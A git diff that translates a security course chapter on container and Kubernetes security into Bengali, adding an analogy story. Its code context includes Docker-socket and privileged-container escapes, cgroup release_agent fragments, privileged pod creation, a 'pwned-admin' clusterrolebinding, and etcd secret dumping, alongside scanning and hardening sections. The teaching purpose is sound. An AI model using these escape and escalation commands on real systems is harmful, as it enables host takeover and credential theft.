@@ -1,18 +1,18 @@
 ---
-title: 'Container & Kubernetes Security'
-subtitle: 'Docker escape techniques, Kubernetes attacks, privileged container abuse, secrets in images, and hardening.'
+title: 'কন্টেইনার ও কুবারনেটিস সিকিউরিটি'
+subtitle: 'ডকার এস্কেপ টেকনিক, কুবারনেটিস অ্যাটাক, প্রিভিলেজড কন্টেইনার অ্যাবিউজ, ইমেজে সিক্রেট, আর হার্ডেনিং।'
 chapter: 18
 level: 'advanced'
-readingTime: '14 min'
+readingTime: '14 মিনিট'
 topics:
   [
     'Docker',
     'Kubernetes',
-    'container escape',
-    'K8s attacks',
-    'privileged container',
-    'pod security',
-    'container security'
+    'কন্টেইনার এস্কেপ',
+    'K8s অ্যাটাক',
+    'প্রিভিলেজড কন্টেইনার',
+    'পড সিকিউরিটি',
+    'কন্টেইনার সিকিউরিটি'
   ]
 ---
 
@@ -22,13 +22,21 @@ topics:
 
 <Callout type="info">
 
-**Real-World Analogy**
+**বাস্তব জীবনের উপমা**
 
-A container is like a prison cell — it's supposed to keep you isolated from other prisoners (containers) and from the guards' area (the host). A privileged container is a cell with unlocked door hinges: you can technically dismantle it from the inside.
+একটা কন্টেইনার অনেকটা জেল সেলের মতো — এর কাজ হলো তোমাকে অন্য কয়েদিদের (কন্টেইনার) আর গার্ডদের এলাকা (হোস্ট) থেকে আলাদা রাখা। একটা প্রিভিলেজড কন্টেইনার হলো এমন একটা সেল যার দরজার কব্জা খোলা — তুমি চাইলে ভেতর থেকেই সেটা খুলে ফেলতে পারো।
 
 </Callout>
 
-## Docker Security Fundamentals
+## গল্পে বুঝি
+
+আল-খোয়ারিজমি একটা বিশাল কার্গো জাহাজের ক্যাপ্টেন। জাহাজের ডেকে সারি সারি সিল করা shipping container — প্রতিটার নিজের মাল, নিজের তালা, একটা থেকে আরেকটায় ঢোকার কোনো পথ নেই। এটাই ছিল নিয়ম: প্রতিটা container আলাদা আর বন্ধ থাকবে, যাতে একটার ভেতরের কেউ বা কিছু বাকিদের নাগাল না পায়। এভাবেই জাহাজ চলত নিরাপদে।
+
+কিন্তু একদিন ইবনে সিনা খেয়াল করলেন, একটা container-এ কে যেন তাড়াহুড়ায় এমন একটা দরজা লাগিয়ে দিয়েছে যেটা সরাসরি জাহাজের ভেতরের করিডোরে খোলে। ফলে ঐ box-এ থাকা লোকটা তালা ভাঙার কষ্টই করল না — দরজা খুলে করিডোরে বেরিয়ে এল, পুরো জাহাজে হাঁটাহাঁটি করতে লাগল, আর শেষমেশ পৌঁছে গেল সেই bridge পর্যন্ত যেখান থেকে গোটা জাহাজ স্টিয়ার করা হয়। একটা box-এর অতিরিক্ত সুবিধা গোটা জাহাজকেই ঝুঁকিতে ফেলে দিল। ফাতিমা আল-ফিহরি তখন সিদ্ধান্ত নিলেন — প্রতিটা container আবার ঠিকমতো সিল করতে হবে, কোনো box-কেই জাহাজের ভেতরে ঢোকার বিশেষ পথ দেওয়া যাবে না, আর bridge-এর দরজা শক্ত করে তালাবদ্ধ রাখতে হবে।
+
+এই গল্পটাই container ও Kubernetes security। সিল করা আলাদা container-গুলো হলো ঠিকমতো isolated container; করিডোরে খোলা দরজাওয়ালা box-টা হলো একটা over-privileged বা দুর্বল isolation-এর container, যেটা দিয়ে attacker escape করে host পর্যন্ত পৌঁছে যায়; আর জাহাজের bridge-এ পৌঁছানো মানে Kubernetes-এর control plane বা API-তে হাত পাওয়া। সমাধানও একই — least privilege মেনে প্রতিটা container সিল রাখা, কোনো privileged container না চালানো, আর control plane-এর access লক করে রাখা। বাস্তবেও এভাবেই বড় বড় breach ঘটেছে: একটা privileged container বা এক্সপোজড control API থেকে attacker গোটা cluster দখল করে ফেলেছে — তাই defence মানে হলো box বন্ধ রাখা, বিশেষ সুবিধা না দেওয়া, আর bridge তালাবদ্ধ রাখা।
+
+## ডকার সিকিউরিটির বেসিক
 
 ```bash
 # Check if you're inside a container
@@ -41,9 +49,9 @@ cat /proc/self/status | grep "CapEff" # effective capabilities
 # CapEff: 0000003fffffffff ← privileged! (all caps)
 ```
 
-## Docker Socket Escape
+## ডকার সকেট এস্কেপ
 
-The Docker socket (`/var/run/docker.sock`) gives full control over Docker. If mounted inside a container, you own the host.
+ডকার সকেট (`/var/run/docker.sock`) ডকারের ওপর পুরো নিয়ন্ত্রণ দেয়। কন্টেইনারের ভেতরে এটা মাউন্ট করা থাকলে তুমি পুরো হোস্টের মালিক হয়ে যাচ্ছো।
 
 ```bash
 # Check if docker socket is mounted
@@ -65,7 +73,7 @@ curl --unix-socket /var/run/docker.sock \
   -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
 ```
 
-## Privileged Container Escape
+## প্রিভিলেজড কন্টেইনার এস্কেপ
 
 ```bash
 # If container is privileged (--privileged flag)
@@ -88,7 +96,7 @@ chmod +x /exploit
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-## Container Misconfiguration Scanning
+## কন্টেইনার মিসকনফিগারেশন স্ক্যানিং
 
 ```bash
 # Trivy — image vulnerability scanner
@@ -113,7 +121,7 @@ docker run --net host --pid host --userns host --cap-add audit_control \
   docker/docker-bench-security
 ```
 
-## Secrets in Docker Images
+## ডকার ইমেজে সিক্রেট
 
 ```bash
 # Images are built in layers — even if you remove a file, it's in the layer history
@@ -134,7 +142,7 @@ docker run --rm vulnerable-app:latest env | grep -i "key\|pass\|secret\|token"
 trufflehog docker --image vulnerable-app:latest
 ```
 
-## Kubernetes Attack Surface
+## কুবারনেটিস অ্যাটাক সারফেস
 
 ```
 Attack paths:
@@ -145,7 +153,7 @@ Attack paths:
   Insecure images → RCE → pod → cluster escape
 ```
 
-## Kubernetes Enumeration
+## কুবারনেটিস এনুমারেশন
 
 ```bash
 # kubectl basics (if you have kubeconfig)
@@ -176,7 +184,7 @@ kube-hunter --remote 192.168.1.100    # external scan
 kube-hunter --pod                      # from inside a pod
 ```
 
-## Kubernetes Privilege Escalation
+## কুবারনেটিস প্রিভিলেজ এস্কেলেশন
 
 ```bash
 # If you can create pods — create privileged pod to escape to host
@@ -224,7 +232,7 @@ kubectl create clusterrolebinding pwned-admin \
   --serviceaccount=default:pwned
 ```
 
-## Kubernetes RBAC Misconfigurations
+## কুবারনেটিস RBAC মিসকনফিগারেশন
 
 ```bash
 # Wildcard permissions (should never exist)
@@ -248,7 +256,7 @@ kubectl get pods --as=cluster-admin
 kubectl --as=system:serviceaccount:kube-system:default get secrets
 ```
 
-## etcd — The K8s Brain
+## etcd — K8s-এর মস্তিষ্ক
 
 ```bash
 # etcd stores all cluster state including secrets in base64
@@ -264,7 +272,7 @@ etcdctl --endpoints https://127.0.0.1:2379 \
 # On managed clusters (EKS, GKE): etcd is not directly accessible — still check RBAC
 ```
 
-## Container Hardening Checklist
+## কন্টেইনার হার্ডেনিং চেকলিস্ট
 
 ```yaml
 # Security context best practices (Kubernetes)
@@ -295,7 +303,7 @@ spec:
   - Egress
 ```
 
-## Real Project: KubeCTF
+## রিয়েল প্রজেক্ট: KubeCTF
 
 ```bash
 # Local K8s practice: kind (Kubernetes in Docker)
